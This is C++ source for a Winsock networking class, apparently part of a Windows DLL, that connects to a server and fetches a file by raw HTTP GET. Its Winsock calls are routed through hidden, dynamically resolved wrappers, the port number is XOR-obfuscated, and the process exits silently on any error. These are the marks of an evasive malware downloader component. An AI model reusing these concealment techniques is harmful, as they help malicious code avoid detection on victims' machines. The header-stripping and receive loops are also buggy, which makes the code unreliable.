#include "DllMain.h"

CWinsock g_Winsock;

CWinsock::CWinsock(VOID)
{
	m_ConnectedSocket = INVALID_SOCKET;
}

CWinsock::~CWinsock(VOID)
{

}

VOID CWinsock::InitWinsock(VOID)
{
	WSADATA wsaData;

	if (WSAStartupHidden(MAKEWORD(2, 2), &wsaData) != 0)
	{
		ExitProcessHidden(0);
	}

}

VOID CWinsock::Connect(const char* pszServerUrl)
{
	m_pszConnectedUrl = pszServerUrl;

	addrinfo hints, *pAddrInfo;

	SecureZeroMemory(&hints, sizeof (hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(pszServerUrl, /*58175*/XorStr<0x1D, 6, 0x23E5AF8C>("\x28\x26\x2E\x17\x14" + 0x23E5AF8C).s, &hints, &pAddrInfo) != 0)
	{
		CleanUp();
		ExitProcessHidden(0);
	}

	if ((m_ConnectedSocket = socketHidden(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol)) == INVALID_SOCKET)
	{
		freeaddrinfoHidden(pAddrInfo);
		CleanUp();
		ExitProcessHidden(0);
	}

	if (connectHidden(m_ConnectedSocket, pAddrInfo->ai_addr, (INT)pAddrInfo->ai_addrlen) != 0)
	{
		freeaddrinfo(pAddrInfo);
		Disconnect();
		CleanUp();
		ExitProcessHidden(0);
	}

	freeaddrinfo(pAddrInfo);
}

VOID CWinsock::SendHttpGet(const char* pszFileUrl, CString &sDestBuffer)
{
	CString sMsg = "GET /";
	sMsg += pszFileUrl;
	sMsg += " HTTP/1.0\r\nHost: "; // 1.0 statt 1.1 wegen Chunked_transfer_encoding
	sMsg += m_pszConnectedUrl;
	sMsg += "\r\n\r\n";

	CHAR szRecvBuffer[512];

	if (sendHidden(m_ConnectedSocket, sMsg, strlen(sMsg), 0) == SOCKET_ERROR)
	{
		Disconnect();
		WSACleanupHidden();
		ExitProcessHidden(0);
	}

	INT iBytesReceived = 0;
	do
	{
		iBytesReceived = recvHidden(m_ConnectedSocket, szRecvBuffer, sizeof (szRecvBuffer), 0);

		sDestBuffer.Append(szRecvBuffer, iBytesReceived);

	} while (iBytesReceived > 0);

	for (size_t i = 0; i < sDestBuffer.GetLength(); i++)
	{
		if (sDestBuffer[i] == '\r' && sDestBuffer[i + 1] == '\n' && sDestBuffer[i + 2] == '\r' && sDestBuffer[i + 3] == '\n')
			sDestBuffer.Delete(0, i + 4);
	}

}

VOID CWinsock::Disconnect(VOID)
{
	if (m_ConnectedSocket != INVALID_SOCKET)
	{
		closesocketHidden(m_ConnectedSocket);
		m_ConnectedSocket = INVALID_SOCKET;
	}

}

VOID CWinsock::CleanUp(VOID)
{
	WSACleanupHidden();
}